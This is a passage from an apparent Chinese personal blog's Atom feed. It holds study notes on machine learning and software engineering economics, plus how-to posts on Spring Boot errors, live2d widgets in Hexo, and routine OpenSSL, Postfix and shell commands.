      &lt;p&gt;觉得之前的那个jekyll的主题太丑了，今天翻新了一下，并把文章和live2d模型迁到了hexo(indigo主题，这次再也不改了)&lt;br&gt;帮信管专业的同学把项目部署到服务器上，因为没打包过war，中间有个地方卡住了，好麻烦记一下。（佛了，为什么不用maven&lt;/p&gt;
    
    </summary>
    
      <category term="java" scheme="http://waynamigo.github.io/categories/java/"/>
    
    
      <category term="java" scheme="http://waynamigo.github.io/tags/java/"/>
    
      <category term="tomcat" scheme="http://waynamigo.github.io/tags/tomcat/"/>
    
      <category term="bash" scheme="http://waynamigo.github.io/tags/bash/"/>
    
  </entry>
  
  <entry>
    <title>机器学习考试</title>
    <link href="http://waynamigo.github.io/2019/06/25/2019-06-25-machinelearning/"/>
    <id>http://waynamigo.github.io/2019/06/25/2019-06-25-machinelearning/</id>
    <published>2019-06-24T16:00:00.000Z</published>
    <updated>2021-07-20T01:52:47.659Z</updated>
    
    <content type="html"><![CDATA[<p> 统  计  学  习<br>真正的统计学习笔记待更新，包括李航统计学习方法和All of Statics两本，</p><a id="more"></a><h2 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h2><p>选择 3分×9<br>简答题 5分×5<br>综合分析 7分×7</p><h2 id="绪论，回归"><a href="#绪论，回归" class="headerlink" title="绪论，回归"></a>绪论，回归</h2><ul><li><p>按学习方式分类的机器学习算法 四类</p></li><li><p>模型评估指标：泛化误差、经验误差</p></li><li><p>欠拟合和过拟合（避免过拟合的方法 正则化-L2、dropout等）</p></li><li><p>分类和聚类和回归的区别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">回归和分类本质相同，都是根据训练集（有标签，有监督学习）做预测，区别是输出不同，分类是定性输出，回归是定量输出</span><br><span class="line">聚类是无监督学习，产生多个集合，单个集合中的元素属性相似</span><br></pre></td></tr></table></figure></li><li><p>多元线性回归求解权重w的方法：最小二乘、梯度下降、误差函数</p></li><li><p>非线性回归如何进行计算:通过中间函数映射</p></li><li><p>岭回归的特点（简答？</p><h2 id="LDA-应该有大题"><a href="#LDA-应该有大题" class="headerlink" title="LDA 应该有大题"></a>LDA 应该有大题</h2></li><li><p>LDA结构，LDA生成文档D的步骤（简答</p></li><li><p>使用LDA的目的：得到文章库中每篇文章的主题分布；<br>   得到新输入文章的主题分布。</p><h2 id="决策树-随机森林-支持向量机"><a href="#决策树-随机森林-支持向量机" class="headerlink" title="决策树 随机森林 支持向量机"></a>决策树 随机森林 支持向量机</h2></li><li><p>决策树是一种有监督的分类方法,它用已有的数据构造出一棵树,再用这棵树对新的数据进行预测。</p></li><li><p>学习过程：通过对训练样本的分析来确定“划分属性”（即内部结点所对应的属性）</p></li><li><p>预测过程：将测试示例从根结点开始，沿着划分属性所构成的“判定测试序列”下行，直到叶结点。</p></li><li><p>决策树（简答）</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1构造过程：特征选择；决策树生成；剪枝（预剪枝和后剪枝的方法）是自根到叶的递归过程</span><br><span class="line">2生成停止条件</span><br><span class="line">当前结点包含的样本全属于同一类别，无需划分;</span><br><span class="line">当前属性集为空, 或是所有样本在所有属性上取值相同，无法划分;</span><br><span class="line">当前结点包含的样本集合为空，不能划分.</span><br><span class="line">3预剪枝：在构造树的过程中，对每个结点在划分前进行估计，如果当前结点的划分不能带来决策树模型泛化性能的提升，则不对当前结点进行划分并且将当前结点标记为叶结点。</span><br><span class="line">后剪枝：先把整颗决策树构造完毕，自底向上对非叶结点进行考察，若将该结点对应的子树换为叶结点能够带来泛化性能的提升，则把该子树替换为叶结点。</span><br><span class="line"></span><br><span class="line">（预剪后剪的对比）</span><br></pre></td></tr></table></figure><p>对节点划分的方法 信息增益 增益率 基尼指数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">信息增益=△信息熵，信息熵越小纯度越大</span><br><span class="line">根据基尼指数：选取划分后使基尼指数最小的属性</span><br></pre></td></tr></table></figure><ul><li>随机森林（简答）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">原始训练集为D,应用Bootstrap法有放回地随机抽取k个新的自助样本集,并由此构建k 棵决策树</span><br><span class="line">每棵树最大限度地生长,不做任何修剪</span><br><span class="line">将生成的多棵决策树组成随机森林,用随机森林分类器对新的数据进行判别与分类,森林中的每一棵树都对新的数据进行预测和投票,最终得票最多的分类项即为随机森林对该数据的预测结果。</span><br><span class="line"></span><br><span class="line">优点：随机森林对于高维数据集的处理能力比较好,它可以处理成千上万的输入变量,并确定最重要的变量,因此被认为是一个不错的降维方法。此外,该模型能够输出变量的重要性程度,这是一个非常便利的功能。</span><br><span class="line">在对缺失数据进行估计时,随机森林是一个十分有效的方法。就算存在大量的数据缺失,随机森林也能较好地保持精确性。</span><br><span class="line">当存在分类不平衡的情况时,随机森林能够提供平衡数据集误差的有效方法。</span><br><span class="line">缺点：随机森林给人的感觉像是一个黑盒子———你几乎无法控制模型内部的运行,只能在不同的参数和随机种子之间进行尝试,从而得到一个更优的分类器。</span><br></pre></td></tr></table></figure><ul><li>支持向量机</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">概念：基本模型定义为特征空间上的间隔最大的线性分类器（按监督学习方式对数据进行二分类的广义线性分类器）</span><br><span class="line">决策边界是对学习样本求解的最大边距超平面</span><br></pre></td></tr></table></figure><ul><li>间隔，最大间隔</li><li>超平面的距离计算（可能考计算 r = |w.T·x+b|/|w|</li><li>核方法 设计核函数（综合题）根据mercer定理：若一个对称函数所对应的核矩阵半正定，那么它可以设为核函数<h2 id="神经网络-kmeans"><a href="#神经网络-kmeans" class="headerlink" title="神经网络 kmeans"></a>神经网络 kmeans</h2></li><li>结构</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入层：接受来自网络外部的数据的顶点</span><br><span class="line">隐藏层：除了输入层和输出层以外的其他层</span><br><span class="line">输出层：向网络外部输出数据的顶点</span><br></pre></td></tr></table></figure><ul><li>超参数有哪些</li><li>如何衡量你的预测算法，损失函数loss</li><li>感知机是啥</li><li>BP是啥 RBF是啥 hopfield是啥 SOM是啥</li><li>计算隐藏层结点数目</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">隐层结点数s与模式数N的关系是：s＝log2N；</span><br><span class="line">隐层结点数s＝2n＋1（n为输入层结点数）；</span><br></pre></td></tr></table></figure><ul><li>CNN</li><li>LSTM</li><li>聚类</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">优点</span><br><span class="line">1.原理简单，实现方便，收敛速度快；</span><br><span class="line">2.聚类效果较优；</span><br><span class="line">3.模型的可解释性较强；</span><br><span class="line">4.调参只需要簇数k；</span><br><span class="line">缺点：</span><br><span class="line">1.k的选取不好把握；</span><br><span class="line">2.初始聚类中心的选择；</span><br><span class="line">3.如果数据的类型不平衡，比如数据量严重失衡或者类别的方差不同，则聚类效果不佳；</span><br><span class="line">4.采用的是迭代的方法，只能得到局部最优解；</span><br><span class="line">5.对于噪声和异常点比较敏感。</span><br></pre></td></tr></table></figure><ul><li>聚类性能度量 外部指标 内部指标</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">外：聚类结果与某个“参考模型”(reference model) 进行比较，需要标记数据如Jaccard 系数，FM 指数，Rand 指数</span><br><span class="line">内：直接考察聚类结果而不用任何参考模型，类内聚集程度和类间离散程度。定义簇内样本间的距离，簇间距离，如DB 指数，Dunn 指数等</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt; 统  计  学  习&lt;br&gt;真正的统计学习笔记待更新，包括李航统计学习方法和All of Statics两本，&lt;/p&gt;
    
    </summary>
    
      <category term="复习" scheme="http://waynamigo.github.io/categories/%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="ML" scheme="http://waynamigo.github.io/tags/ML/"/>
    
  </entry>
  
  <entry>
    <title>这学期项目中的坑</title>
    <link href="http://waynamigo.github.io/2019/06/12/2019-06-12-%E9%A1%B9%E7%9B%AE%E5%9D%91/"/>
    <id>http://waynamigo.github.io/2019/06/12/2019-06-12-项目坑/</id>
    <published>2019-06-11T16:00:00.000Z</published>
    <updated>2021-07-20T01:40:29.679Z</updated>
    
    <content type="html"><![CDATA[<p>佛了</p><a id="more"></a><h2 id="mysql分离-springboot-eurake"><a href="#mysql分离-springboot-eurake" class="headerlink" title="mysql分离 + springboot + eurake"></a>mysql分离 + springboot + eurake</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">原因是 配置远程数据库时，springboot 没有创建表，自己手动建了hibernate sequence后就会报这个错。</span><br><span class="line">表现为插入数据失败，error &quot;could not read a hi value - you need to populate the table&quot;.</span><br><span class="line"></span><br><span class="line">解决方法是对nextval设置初始值，stackoverflow的另一种方案是</span><br><span class="line">改掉注释</span><br><span class="line">@GeneratedValue(strategy = GenerationType.AUTO)改为@GeneratedValue(strategy = GenerationType.IDENTITY)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;佛了&lt;/p&gt;
    
    </summary>
    
      <category term="java" scheme="http://waynamigo.github.io/categories/java/"/>
    
    
      <category term="mysql" scheme="http://waynamigo.github.io/tags/mysql/"/>
    
      <category term="Spring" scheme="http://waynamigo.github.io/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>jekyll加入live2d的模型</title>
    <link href="http://waynamigo.github.io/2019/05/14/2019-05-14-jekyll%E5%8A%A0%E5%85%A5live2d%E6%A8%A1%E5%9E%8B/"/>
    <id>http://waynamigo.github.io/2019/05/14/2019-05-14-jekyll加入live2d模型/</id>
    <published>2019-05-13T16:00:00.000Z</published>
    <updated>2021-07-20T01:50:03.281Z</updated>
    
    <content type="html"><![CDATA[<p><del>由于不打算再迁到hexo了，把jekyll加入live2d模型的方法记录一下</del><br>2019-8-1: 迁hexo了。</p><a id="more"></a><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>npm install hexo-cli</p><p>使用hexo初始化一个本地的博客文件夹 hexo init</p><p>安装需要的依赖 npm install就可以了</p><h3 id="在hexo安装live2d插件"><a href="#在hexo安装live2d插件" class="headerlink" title="在hexo安装live2d插件"></a>在hexo安装live2d插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add hexo-helper-live2d</span><br></pre></td></tr></table></figure><ul><li>详见 <a href="https://github.com/EYHN/hexo-helper-live2d" target="_blank" rel="noopener">hexo-helper-live2d</a></li></ul><h3 id="在hexo配置一下"><a href="#在hexo配置一下" class="headerlink" title="在hexo配置一下"></a>在hexo配置一下</h3><p>在config里面加入live2d的配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">hexo-helper-live2d项目给的配置文件例子</span><br><span class="line">live2d:</span><br><span class="line">  model:</span><br><span class="line">    scale: 1</span><br><span class="line">    hHeadPos: 0.5</span><br><span class="line">    vHeadPos: 0.618</span><br><span class="line">  display:</span><br><span class="line">    superSample: 2</span><br><span class="line">    width: 150</span><br><span class="line">    height: 300</span><br><span class="line">    position: right</span><br><span class="line">    hOffset: 0</span><br><span class="line">    vOffset: -20</span><br><span class="line">  mobile:</span><br><span class="line">    show: true</span><br><span class="line">    scale: 0.5</span><br><span class="line">  react:</span><br><span class="line">    opacityDefault: 0.7</span><br><span class="line">    opacityOnHover: 0.2</span><br></pre></td></tr></table></figure><p>找你要加入的live2d模型（有钱的可以去订做，把widget替换掉。</p><p><strong>koharu在这里面<a href="https://github.com/xiazeyu/live2d-widget-models" target="_blank" rel="noopener">live2d-widget-model</a></strong></p><p>clone所需要的live2d模型后，还需要在config里面加入一个live2d配置。</p><p>配置文件如下<del>（注释是wife还行）</del></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#wife</span><br><span class="line">live2d:</span><br><span class="line">  enable: true</span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  model:</span><br><span class="line">    use: koharu  #模板目录，在node_modules里</span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: 150 </span><br><span class="line">    height: 300</span><br><span class="line">  mobile:</span><br><span class="line">    show: false</span><br></pre></td></tr></table></figure><h3 id="启动hexo，会自动编译生成可用的模型文件"><a href="#启动hexo，会自动编译生成可用的模型文件" class="headerlink" title="启动hexo，会自动编译生成可用的模型文件"></a>启动hexo，会自动编译生成可用的模型文件</h3><p>目的文件live2d文件夹，编译后的文件目录如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_config.yml  live2d_models  package.json  scaffolds  themes</span><br><span class="line">db.json      node_modules   public        <span class="built_in">source</span></span><br></pre></td></tr></table></figure><h3 id="在index中找一个js标签，加入到jekyll的需要加的layout文件中就可以直接用了"><a href="#在index中找一个js标签，加入到jekyll的需要加的layout文件中就可以直接用了" class="headerlink" title="在index中找一个js标签，加入到jekyll的需要加的layout文件中就可以直接用了"></a>在index中找一个js标签，加入到jekyll的需要加的layout文件中就可以直接用了</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;L2Dwidget.init(&#123;<span class="string">"pluginModelPath"</span>:<span class="string">"assets/"</span>,<span class="string">"model"</span>:&#123;<span class="string">"jsonPath"</span>:<span class="string">"/live2dw/assets/koharu.model.json"</span>&#125;,<span class="string">"display"</span>:&#123;<span class="string">"position"</span>:<span class="string">"right"</span>,<span class="string">"width"</span>:<span class="number">150</span>,<span class="string">"height"</span>:<span class="number">300</span>&#125;,<span class="string">"mobile"</span>:&#123;<span class="string">"show"</span>:<span class="literal">false</span>&#125;,<span class="string">"log"</span>:<span class="literal">false</span>,<span class="string">"pluginJsPath"</span>:<span class="string">"lib/"</span>,<span class="string">"pluginRootPath"</span>:<span class="string">"live2dw/"</span>,<span class="string">"tagMode"</span>:<span class="literal">false</span>&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;del&gt;由于不打算再迁到hexo了，把jekyll加入live2d模型的方法记录一下&lt;/del&gt;&lt;br&gt;2019-8-1: 迁hexo了。&lt;/p&gt;
    
    </summary>
    
      <category term="其他" scheme="http://waynamigo.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="live2d" scheme="http://waynamigo.github.io/tags/live2d/"/>
    
  </entry>
  
  <entry>
    <title>软件工程经济学</title>
    <link href="http://waynamigo.github.io/2019/05/04/2019-05-04-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E7%BB%8F%E6%B5%8E%E5%AD%A6/"/>
    <id>http://waynamigo.github.io/2019/05/04/2019-05-04-软件工程经济学/</id>
    <published>2019-05-03T16:00:00.000Z</published>
    <updated>2021-07-20T01:53:00.242Z</updated>
    
    <content type="html"><![CDATA[<p>from 华南理工大学 左保和老师<br>软件项目如何进行融资、分析风险、敏感性因素等</p><a id="more"></a><h2 id="软件工程经济学基础"><a href="#软件工程经济学基础" class="headerlink" title="软件工程经济学基础"></a>软件工程经济学基础</h2><h3 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">requirement</span><br><span class="line">design</span><br><span class="line">constructure 详细设计和总体设计在design完成，</span><br><span class="line">testing</span><br><span class="line">maintenance</span><br><span class="line">configure management，软件团队的管理办法</span><br><span class="line">management </span><br><span class="line">tools and method</span><br><span class="line">engineering process</span><br><span class="line">quality</span><br></pre></td></tr></table></figure><h3 id="货币的时间成本，举例说明这个概念的重要性"><a href="#货币的时间成本，举例说明这个概念的重要性" class="headerlink" title="货币的时间成本，举例说明这个概念的重要性"></a>货币的时间成本，举例说明这个概念的重要性</h3><p>1、货币时间成本<br>按利率衡量<br>特定时间内 ，利息/借贷资本</p><ul><li>利息计算方法<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">单利 I = iP N ==&gt; 利率*存款*计息周期数</span><br><span class="line">复利 F = P（1+i）^N</span><br></pre></td></tr></table></figure></li></ul><h3 id="掌握的重要概念part1"><a href="#掌握的重要概念part1" class="headerlink" title="掌握的重要概念part1"></a>掌握的重要概念part1</h3><p>利率、利息额、借贷资本总额<br>通货膨胀率、消费者价格指数（CPI）、生产者价格指数（PPI）<br>利息的计算方法：单利、复利、计息期（一般为年，或换算为年）<br>等值计算的概念和意义（现值、折现率）<br>等额支付（等额本金、等额本息）<br>税收、营业税、增值税、营改增<br>贬值、折旧</p><h4 id="工程经济学的概念"><a href="#工程经济学的概念" class="headerlink" title="工程经济学的概念"></a>工程经济学的概念</h4><p>工程经济学是运用有效的方法对工程各种因素进行评价，确定最佳方案，做出投资决策的学科，的研究对象是工程项目。<br>对软件工程领域来说，</p><h4 id="金融学"><a href="#金融学" class="headerlink" title="金融学"></a>金融学</h4><p>明确目标周期机构<br>商业战略 管理现今流量管理</p><h4 id="会计学原理资产"><a href="#会计学原理资产" class="headerlink" title="会计学原理资产"></a>会计学原理资产</h4><p>对外投资<br>固定资产<br>货币资金<br>收入费用利润</p><h4 id="现金流量"><a href="#现金流量" class="headerlink" title="现金流量"></a>现金流量</h4><p>现金的定义</p><ul><li>指企业的库存现金和银行存款，还包括现金等价物，即企业持有的期限短、流动性强、容易转换为已知金额现金、价值变动风险很小的投资等</li><li>一项投资被确认为现金等价物必须同时具备四个条件：期限短、流动性强、易于转换为已知金额现金、价值改动风险小。</li><li>是企业财力的评价指标之一</li></ul><h4 id="现金流量图"><a href="#现金流量图" class="headerlink" title="现金流量图"></a>现金流量图</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">现金流入流出</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|_________________</span><br><span class="line">|                 时间,指财务周期</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br></pre></td></tr></table></figure><h4 id="支付方式"><a href="#支付方式" class="headerlink" title="支付方式"></a>支付方式</h4><p>等额支付</p><p>线性梯度支付<br>p=G{}<br>几何梯度支付<br>第二年 = 第一年* (1+G)</p><h4 id="通货膨胀"><a href="#通货膨胀" class="headerlink" title="通货膨胀"></a>通货膨胀</h4><p>纸币的发行量超过了流通中实际需要的数量，多余的部分继续在流通中流转，就会造成通货膨胀（百度百科）</p><h4 id="折现"><a href="#折现" class="headerlink" title="折现"></a>折现</h4><p>衡量现金流量，税收，</p><h4 id="税收"><a href="#税收" class="headerlink" title="税收"></a>税收</h4><p>营业 教育 增值</p><h3 id="基准收益率与利率的区别"><a href="#基准收益率与利率的区别" class="headerlink" title="基准收益率与利率的区别"></a>基准收益率与利率的区别</h3><p>基准收益率也被称为基准折现率。<br>区别1：和利率不同，利率是资金利息额与借贷资金额的比率；收益率是投资的回报率，利润占使用平均资金的百分比。<br>区别2：基准收益率是企业或行业或投资者以动态的观点所确定的、可接受的投资项目最低标准的受益水平，由国家发改委和建设部制定。<br>基准利率由中国人民银行制定。<br>区别3：上节讲的通货膨胀、利息等宏观因素是影响利率的主要因素；<br>而对收益率来说，商品的生产率、运维生产率，投资，不确定度、消费者的消费偏好、投资风险、物价变动等因素是主要因素，并且根据每个行业的行情变动相对利率较大。<br>软件行业的基准收益率是15%。</p><ul><li>发改委官网、国家统计局官网上找不到数据，在材料《建设项目经济评价方法与参数》上有对各行业经济的各项参数的详细介绍</li><li>部分数据参照“北京软件造价评估技术创新联盟”网站的报告，包括2016-2018年，<a href="http://www.bscea.org/Uploads/ueditor/file/20181012/5bc00c9f71b20.pdf" target="_blank" rel="noopener">2018中国软件行业基准数据报告</a></li></ul><h3 id="cpi-，-spi"><a href="#cpi-，-spi" class="headerlink" title="cpi ， spi"></a>cpi ， spi</h3><p>CPI=EV/AC，SPI=EV/PV</p><p>cpi 成本绩效指标<br>甘特图 贬值进度计划<br>进度控制指标<br>spi &lt;1  进度落后  =1 按计划进行  &gt;1 超前进行<br>开发者效率</p><h3 id="软件项目质量"><a href="#软件项目质量" class="headerlink" title="软件项目质量"></a>软件项目质量</h3><p>ISO度量</p><h3 id="软件质量保证"><a href="#软件质量保证" class="headerlink" title="软件质量保证"></a>软件质量保证</h3><p>制定推行软件工程质量标准<br>研究 采用各种技术手段<br>控制各种变更<br>制定并执行测试计划<br>按质量标准对软件质量进行度量<br>组织各种技术评审会</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;from 华南理工大学 左保和老师&lt;br&gt;软件项目如何进行融资、分析风险、敏感性因素等&lt;/p&gt;
    
    </summary>
    
      <category term="软件工程经济学" scheme="http://waynamigo.github.io/categories/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E7%BB%8F%E6%B5%8E%E5%AD%A6/"/>
    
    
      <category term="其他" scheme="http://waynamigo.github.io/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>备忘的一些操作</title>
    <link href="http://waynamigo.github.io/2019/04/17/2019-04-17-%E5%A4%87%E5%BF%98%E7%9A%84%E4%B8%80%E4%BA%9B%E7%83%A6%E4%BA%BA%E6%93%8D%E4%BD%9C/"/>
    <id>http://waynamigo.github.io/2019/04/17/2019-04-17-备忘的一些烦人操作/</id>
    <published>2019-04-16T16:00:00.000Z</published>
    <updated>2021-07-20T01:32:18.316Z</updated>
    
    <content type="html"><![CDATA[<p>包括用linux自带openssl签postfix证书、流媒体证书按网上教程（找不到之类的问题，最后自己把证书试出来了，见第一部分，还有博客cdn换成tx云因为配置不一样导致好久没发现cdn没启用等尴尬的问题</p><a id="more"></a><h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>ubuntu自带的openssl包含的证书和RSA密钥等，相当于一套封装的加密套件。</p><ul><li>based on SSL&amp;TLS</li><li>生成常用key的指令如下（很久远了，之前记下的只有几个，以后更新）</li><li>如果没有的话可以下载包ca-certificates</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public:</span><br><span class="line">openssl rsa -in rsa_private.key -pubout -out rsa_public.key</span><br><span class="line"></span><br><span class="line">private ase256加密:</span><br><span class="line">openssl genrsa -aes256 -passout pass:111111 -out rsa_aes_private.key 2048</span><br><span class="line"></span><br><span class="line">签postfix实现加密，关键的两步:</span><br><span class="line">由于Thawte_Premium_Server_CA.pem证书失效，在新的cacert包里面更换成thawte_Primary_Root_CA.pem</span><br><span class="line">cat /etc/ssl/certs/thawte_Primary_Root_CA.pem | sudo tee -a /etc/postfix/cacert.pem</span><br><span class="line">修改main.cf的smtp_tls_CAfile = /etc/postfix/cacert.pem，</span><br><span class="line">使用postmap生成用户名和密码的hash表</span><br><span class="line">重新加载/etc/init.d/postfix（postfix服务的jio本）就可以使用了</span><br></pre></td></tr></table></figure><h2 id="怪事情，opencv的cvtColor突然不能用，但是服务器上没问题"><a href="#怪事情，opencv的cvtColor突然不能用，但是服务器上没问题" class="headerlink" title="怪事情，opencv的cvtColor突然不能用，但是服务器上没问题"></a>怪事情，opencv的cvtColor突然不能用，但是服务器上没问题</h2><ul><li>解决方法找了其他源。。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda install --channel https://conda.anaconda.org/menpo opencv3</span><br></pre></td></tr></table></figure></li></ul><h2 id="shell以前记的笔记"><a href="#shell以前记的笔记" class="headerlink" title="shell以前记的笔记(_ _)"></a>shell以前记的笔记(_ _)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">开头加一句#!/bin/bash 说明是一个脚本</span><br><span class="line">变量不需要声明可以直接用</span><br><span class="line">变量取值的话加美元</span><br><span class="line">If while中条件注意空格</span><br><span class="line">变量赋值不加空格</span><br><span class="line">Echo重定向：如果需要变量值和字符串相连，加大括号。</span><br><span class="line">没写i自增导致死循环</span><br><span class="line">If后一定要写fi代表结束，汇编格式吼啊</span><br></pre></td></tr></table></figure><ul><li>一个技巧，似乎是以前在用别人写的caffe库的时候出现了这个问题，忘了报什么错了，不是记得很清楚</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    在Linux下编程时，或者说在一个有很多头文件互相 include 的场景中，经常会遇到不清楚一个变量</span><br><span class="line">的完整类型定义的情况（因为有用 <span class="keyword">typedef</span> 封装），从而有可能遇到编译出错。</span><br><span class="line">    例如在使用 stat 来读取文件属性的 i-node number 时，查看 stat 的手册，得知这个变量 st_ino 的变量类型是 <span class="keyword">ino_t</span>，而我们不清楚 <span class="keyword">ino_t</span>的准确定义究竟是什么。</span><br><span class="line">可以用如下方法：声明一个这样的变量即可。</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">ino_t</span> blah;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">然后运行如下指令：</span><br><span class="line"></span><br><span class="line">gcc -E test.c | grep <span class="keyword">ino_t</span></span><br><span class="line">-E 选项的意思是：在预处理过程后结束并输出到标准输出。</span><br><span class="line">文档原文如下</span><br><span class="line">-E Stop after the preprocessing stage; <span class="keyword">do</span> <span class="keyword">not</span> run the compiler proper. </span><br><span class="line">The output is in the form of preprocessed source code, which is sent to the standard 